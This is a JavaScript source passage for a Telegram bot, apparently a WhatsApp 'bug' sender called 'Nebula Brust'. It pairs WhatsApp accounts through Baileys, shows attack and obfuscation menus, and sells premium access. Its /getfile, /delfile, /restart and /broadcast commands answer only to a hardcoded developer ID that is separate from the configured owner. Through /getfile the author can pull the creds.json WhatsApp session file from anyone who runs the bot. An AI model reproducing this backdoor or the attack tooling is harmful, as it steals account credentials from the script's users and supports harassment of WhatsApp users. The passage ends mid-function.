const { Telegraf, Markup} = require("telegraf");
const fs = require("fs");
const { obfuscate } = require("js-confuser")
const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWASocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");
const axios = require("axios");
const P = require("pino");
const chalk = require("chalk");
const path = require("path");
const crypto = require("crypto");
async function getBuffer(url) {

    try {

        const res = await axios.get(url, { responseType: "arraybuffer" });

        return res.data;

    } catch (error) {

        console.error(error);

        throw new Error("Gagal mengambil data.");

    }

}
const exec = require("child_process").exec;
const tdxlol = fs.readFileSync('./tdx.jpeg');
const sessions = new Map();
const expiredDate = new Date('2025-02-6');
const userHasRunTes = new Map();
const userSelection = new Map();
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
const USERS_FILE = "./users.json";
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
// Fungsi untuk mendapatkan nama pengguna dari konteks bot
function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}
// Middleware untuk membatasi akses hanya ke grup tertentu
const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};

// Inisialisasi bot Telegram
const bot = new Telegraf(BOT_TOKEN);

// Helper untuk tidur sejenak
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
//Expired Tester
const isExpired = () => new Date() >= expiredDate;
// Fungsi untuk menerima input dari terminal
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
//Midpware Multi
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

{}
// Fungsi untuk memulai sesi WhatsApp
async function connectToWhatsApp(botNumber, ctx) {
  let statusMessage = await ctx.reply(
    `╔══════════════════════╗  
║      INFORMATION      
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : INITIALIZATION  
╚══════════════════════╝`,
    { parse_mode: "Markdown" }
  );

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : RECONNECTING  
╚═══════════════════╝`,
          { parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : FAILED  
╚═══════════════════╝`,
          { parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `╔═══════════════════╗  
║    INFORMATION    ║  
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : CONNECTED  
╚═══════════════════╝`,
        { parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = `\`${code.match(/.{1,4}/g)?.join("-") || code}\``;
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMessage.message_id,
            null,
            `╔══════════════════════╗  
║    PAIRING SESSION  
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ CODE   : ${formattedCode}  
╚══════════════════════╝`,
            { parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `╔══════════════════════╗  
║    PAIRING SESSION   
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : ${error.message}  
╚══════════════════════╝`,
          { parse_mode: "Markdown" }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
// Mulai sesi WhatsApp
async function initializeBot() {
  console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NEBULA BRUST
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CREATED BY DELAPLACE
┃ THANKS FOR USE MY SCRIPT TESTER
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);

  await initializeWhatsAppConnections();
}

initializeBot();
// Middleware untuk log pesan teks saja
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const message = ctx.message;
    const senderName = message.from.first_name || message.from.username || "Unknown";
    const senderId = message.from.id;
    const chatId = message.chat.id;
    const isGroup = message.chat.type === "group" || message.chat.type === "supergroup";
    const groupName = isGroup ? message.chat.title : null;
    const messageText = message.text;
    const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

    console.log("\x1b[30m--------------------\x1b[0m");
    console.log(chalk.bgHex("#e74c3c").bold("▢ New Message"));
    console.log(
      chalk.bgHex("#00FF00").black(
        `   ╭─ > Tanggal: ${date} \n` +
        `   ├─ > Pesan: ${messageText} \n` +
        `   ├─ > Pengirim: ${senderName} \n` +
        `   ╰─ > Sender ID: ${senderId}`
      )
    );

    if (isGroup) {
      console.log(
        chalk.bgHex("#00FF00").black(
          `   ╭─ > Grup: ${groupName} \n` +
          `   ╰─ > GroupJid: ${chatId}`
        )
      );
    }

    console.log();
  }
  return next(); // Lanjutkan ke handler berikutnya
});
bot.use((ctx, next) => {
    if (isExpired()) {
        ctx.reply("⚠️ Bot ini telah kedaluwarsa. Hubungi admin untuk memperbarui.");
    }
    return next();
});
bot.use((ctx, next) => {
    // Set variabel global untuk menentukan tipe bot
    let botForGroup = true; // Hanya untuk grup
    let botForPrivateChat = false; // Tidak untuk private chat

    // Gunakan middleware checkChatType
    checkChatType(ctx, next);
});
let users = [];
if (fs.existsSync(USERS_FILE)) {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf8");
    users = JSON.parse(data);
  } catch (error) {
    console.error("Gagal memuat daftar pengguna:", error.message);
  }
}

// Fungsi untuk menyimpan daftar pengguna ke file
function saveUsersToFile() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
  } catch (error) {
    console.error("Gagal menyimpan daftar pengguna:", error.message);
  }
}
// Command broadcast (hanya bisa digunakan oleh admin)
const Dev_ID = 5713654337; // Ganti dengan ID admin

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  // Ambil pesan setelah perintah /broadcast
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("[❌ Format Salah!] Cobalah /broadcast (Pesan Anda)");
  }

  // Tambahkan footer ke pesan
  const footer = "\n\n🍂 Dikirim Oleh DeLaplace Sang Developer";
  const finalMessage = message + footer;

  // Kirim pesan ke semua pengguna
  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, { parse_mode: "Markdown" });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  // Balas ke admin setelah broadcast selesai
  ctx.reply(`✅ Broadcast selesai! Pesan berhasil dikirim ke ${successCount} pengguna.`);
});
// Handler untuk mengambil file
bot.command('getfile', async (ctx) => {
  // Pastikan hanya developer yang dapat mengakses command ini
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = './session/creds.json'; // Path ke file yang ingin diambil

  try {
    // Kirim file ke developer
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} berhasil dikirim ke sockwzz.`);
  } catch (error) {
    console.error("Kosong njir:", error);
    ctx.reply("User Belom Sambungin Device Jir😜.");
  }
});
bot.command('listbot', async (ctx) => {
  try {
    const activeDevicesCount = sessions.size;

    ctx.reply(`
    
╭───── STATUS BOT ──────╮
│ Status Sender : ${activeDevicesCount === 0 ? 'No Active Sender' : `${activeDevicesCount} Sender Active`}
╰─────────────────────╯
`);
  } catch (error) {
    console.error("Error in listbot:", error);
    ctx.reply(
      "Terjadi kesalahan saat menampilkan status bot. Silakan coba lagi."
    );
  }
});
bot.command('status', (ctx) => {
    ctx.reply(`✅ Bot Aktif! Expired pada: ${expiredDate.toDateString()}`);
});
const photoUrls = [
  'https://img86.pixhost.to/images/382/561078759_uploaded_image.jpg',
];

// Fungsi untuk memilih foto secara acak
function getRandomPhoto() {
  const randomIndex = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomIndex];
}
async function sendMainMenu(ctx) {
  const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
  }
const randomPhoto = getRandomPhoto();
const activeDevicesCount = sessions.size;
const buttons = Markup.inlineKeyboard([
  [
    Markup.button.callback('𝑷𝑹𝑬𝑴𝑰𝑼𝑴', 'option1'),
    Markup.button.callback('𝑶𝑾𝑵𝑬𝑹', 'option2'),
  ],
  [Markup.button.callback('𝑻𝑯𝑨𝑵𝑲𝑺 𝑻𝑶', 'tqto')],
  [Markup.button.url('📢 Join Channel', 'https://t.me/allt3tibayzz')],
]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
╭───── ⧼ 𝑰 𝒏 𝒇 𝒐 - 𝑩 𝒐 𝒕 𝒔 ⧽
│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
│ᴠᴇʀsɪ : ʙᴇᴛᴀ
│ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
╰─────
╭───── ⧼ 𝑺 𝒕 𝒂 𝒕 𝒖 𝒔 - 𝑺 𝒆 𝒏 𝒅 𝒆 𝒓 ⧽
│ ✦ Status Sender : ${activeDevicesCount === 0 ? 'No Active Sender' : `${activeDevicesCount} Sender Active`}
╰─────
╭───── ⧼ 𝑩 𝒖 𝒈 𝑴 𝒆 𝒏 𝒖 ⧽
│ ✦  /nebula *<Button>*
│ ✦  /addsender *<Multi Sender>*
│ ✦  /deploy *<token> <ownerid>*
│ ✦  /status *<info expired>*
╰─────
  © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
    `,
    parse_mode: 'Markdown',
    reply_markup: buttons.reply_markup,
  });
}

bot.start(async (ctx) => {
  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomPhoto(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

// Action untuk tampilkan kembali menu utama
bot.action('startmenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomPhoto = getRandomPhoto();
const activeDevicesCount = sessions.size;
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
    [
    Markup.button.callback('𝑷𝑹𝑬𝑴𝑰𝑼𝑴', 'option1'),
    Markup.button.callback('𝑶𝑾𝑵𝑬𝑹', 'option2'),
  ],
  [Markup.button.callback('𝑻𝑯𝑨𝑵𝑲𝑺 𝑻𝑶', 'tqto')],
  [Markup.button.url('Channel', 'https://t.me/TheyFreak')],
]);
  const caption = `
╭───── ⧼ 𝑰 𝒏 𝒇 𝒐 - 𝑩 𝒐 𝒕 𝒔 ⧽
│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
│ᴠᴇʀsɪ : ʙᴇᴛᴀ
│ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
╰─────
╭───── ⧼ 𝑺 𝒕 𝒂 𝒕 𝒖 𝒔 - 𝑺 𝒆 𝒏 𝒅 𝒆 𝒓 ⧽
│ ✦ Status Sender : ${activeDevicesCount === 0 ? 'No Active Sender' : `${activeDevicesCount} Sender Active`}
╰─────
╭───── ⧼ 𝑩 𝒖 𝒈 𝑴 𝒆 𝒏 𝒖 ⧽
│ ✦  /nebula *<Button>*
│ ✦  /addsender *<Multi Sender>*
│ ✦  /status *<info expired>*
╰─────
  © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
`;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('option1', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝑵𝑬𝑿𝑻', 'option3')],
    [Markup.button.callback('𝑩𝑨𝑪𝑲 𝑻𝑶 𝑴𝑬𝑵𝑼', 'startmenu')], // Tombol baru "Next"
  ]);

  const caption = `
╭── ⧼ 𝑷 𝒓 𝒆 𝒎 𝒊 𝒖 𝒎 - 𝑴 𝒆 𝒏 𝒖 ⧽ 
│
│ /enccsutom
│ /enc1 
│ /enc2 
│ /enc3
│ /enc4
│ /enc5
│ /enc6
│
╰────── 
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk OwnerMenu
bot.action('option2', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝑵𝑬𝑿𝑻', 'option4')],
    [Markup.button.callback('𝑩𝑨𝑪𝑲 𝑻𝑶 𝑴𝑬𝑵𝑼', 'startmenu')],
  ]);

  const caption = `
╭─── ⧼ 𝑶 𝒘 𝒏 𝒆 𝒓 - 𝑴 𝒆 𝒏 𝒖 ⧽
│
│ rem
│ /addprem
│ /addowner
│ /delowner
│ /addadmin
│ /deladmin
│
╰──────
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('option4', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝑩𝑨𝑪𝑲', 'option2')],
  ]);

  const caption = `
╭─── ⧼ 𝑶 𝒘 𝒏 𝒆 𝒓 - 𝑴 𝒆 𝒏 𝒖 ⧽
│
│ /deploy
│ /deldeply
│ /listdeploy
│ /disablemodes
│ /grouponly
│
╰──────
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
    `;

  await editMenu(ctx, caption, buttons);
});
bot.action('option3', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝑩𝑨𝑪𝑲', 'option1')],
  ]);

  const caption = `
╭── ⧼ 𝑷 𝒓 𝒆 𝒎 𝒊 𝒖 𝒎 - 𝑴 𝒆 𝒏 𝒖 ⧽
│
│ /statusprem
│ /info
│ /
│ /
│ /
│
╰────── 
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk About
bot.action('tqto', async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝑩𝑨𝑪𝑲 𝑻𝑶 𝑴𝑬𝑵𝑼', 'startmenu')],
  ]);

  const caption = `
╭── ⧼ 𝑻 𝒉 𝒂 𝒏 𝒌 𝒔 - 𝑻 𝒐 ⧽
│
│ ᴄʀᴇᴀᴛᴏʀ : DᴇLᴀᴘʟᴀᴄᴇ
│ ʙᴀsᴇ : ᴄᴀʏᴡᴢᴢ
│ ᴄᴀsᴇ : ᴘᴀɪɴᴢʏ
│
│ ʙᴇsᴛ ғʀɪᴇɴᴅ :
│ FᴜɴᴄᴛɪᴏɴLɪʜX
│ Xᴋʏᴢᴏ
│ JᴜsᴛCʟᴏᴡɴ
│
╰────── 
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ
  `;

  await editMenu(ctx, caption, buttons);
});
// URL raw GitHub file
const USERS_PREMIUM_FILE = 'usersPremium.json';
// Inisialisasi file usersPremium.json
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}
bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});
// Command untuk melihat daftar user premium
    // Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah owner atau memiliki akses DeLaplace
    if (ownerId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addpremium <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deleteprem <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus premium user, implementasi tergantung logika sistem Anda
    const wasDeleted = removePremium(targetUserId); // Pastikan Anda memiliki fungsi ini

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
}); 
// Command untuk menghapus file tertentu
bot.command('delfile', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username;

if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }
  

  // Tentukan file yang ingin dihapus
  const fileName = 'session/creds.json'; // Ganti dengan nama file yang ingin Anda hapus
  const filePath = path.resolve(__dirname, fileName);

  // Periksa apakah file ada
  if (!fs.existsSync(filePath)) {
    return ctx.reply(`⚠️ File "${fileName}" tidak ditemukan.`);
  }

  // Hapus file
  try {
    fs.unlinkSync(filePath);
    ctx.reply(`✅ File "${fileName}" berhasil dihapus.`);
  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal menghapus file "${fileName}".`);
  }
});
bot.command("restart", async (ctx) => {
  // Periksa apakah pengguna adalah Developer
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  try {
    await ctx.reply("🔄 Bot akan restart dalam beberapa detik...");
    setTimeout(() => {
      process.exit(0); // Menghentikan proses untuk restart
    }, 3000);
  } catch {
    ctx.reply("❌ Terjadi kesalahan saat mencoba restart bot.");
  }
});
// Contoh fungsi `removePremium`, implementasikan sesuai database atau logika Anda
function removePremium(userId) {
    // Implementasi tergantung sistem, return true jika berhasil
    // Contoh:
    // const result = database.deletePremium(userId);
    // return result.success;
    console.log(`Removing premium access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}
bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Logika untuk pengguna premium
    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
const USERS_DeLaplace_FILE = 'usersDeLaplace.json';
// Inisialisasi file usersDeLaplace.json
let usersDeLaplace = {};
if (fs.existsSync(USERS_DeLaplace_FILE)) {
    usersDeLaplace = JSON.parse(fs.readFileSync(USERS_DeLaplace_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_DeLaplace_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status DeLaplace
function isDeLaplace(userId) {
    return usersDeLaplace[userId] && usersDeLaplace[userId].DeLaplaceUntil > Date.now();
}

// Fungsi untuk menambahkan user ke DeLaplace
function addDeLaplace(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersDeLaplace[userId] = { DeLaplaceUntil: expireTime };
    fs.writeFileSync(USERS_DeLaplace_FILE, JSON.stringify(usersDeLaplace, null, 2));
}

// Command untuk mengecek status DeLaplace
bot.command('statusowner', (ctx) => {
    const userId = ctx.from.id;

    if (isDeLaplace(userId)) {
        const expireDate = new Date(usersDeLaplace[userId].DeLaplaceUntil);
        return ctx.reply(`✅ You have Owner access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have Owner Acess.');
    }
});
async function startBot() {};

// Panggil fungsi untuk menjalankan bot
startBot();
// Command untuk melihat daftar user dengan status DeLaplace
bot.command('listowner', async (ctx) => {
    const DeLaplaceUsers = Object.entries(usersDeLaplace)
        .filter(([userId, data]) => data.DeLaplaceUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.DeLaplaceUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (DeLaplaceUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            DeLaplaceUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙊𝙬𝙣𝙚𝙧𝙨 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://t.me/DeLaplace"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have Owner access.');
    }
});
bot.command('info', async (ctx) => {
  const mention = ctx.message.text.split(' ')[1]; // Mendapatkan username setelah perintah /info
  let user;
  
  if (mention) {
    // Jika ada username, ambil informasi pengguna berdasarkan username
    try {
      user = await ctx.telegram.getChat(mention);
      const userLink = `https://t.me/${mention}`; // Link pengguna
      ctx.reply(`ᝄ ᴜꜱᴇʀɪɴꜰᴏ:
│ɪᴅ: ${user.id}
│ꜰɪʀꜱᴛ ɴᴀᴍᴇ: ${user.first_name || 'Tidak ada nama depan'}
│ᴜꜱᴇʀɴᴀᴍᴇ: @${mention}
│ᴜꜱᴇʀʟɪɴᴋ: ${userLink}`);
    } catch (error) {
      ctx.reply(' Format Salah! Lakukan Lah Seperti Ini /info');
    }
  } else {
    // Jika tidak ada username, tampilkan info pengguna yang mengirim perintah
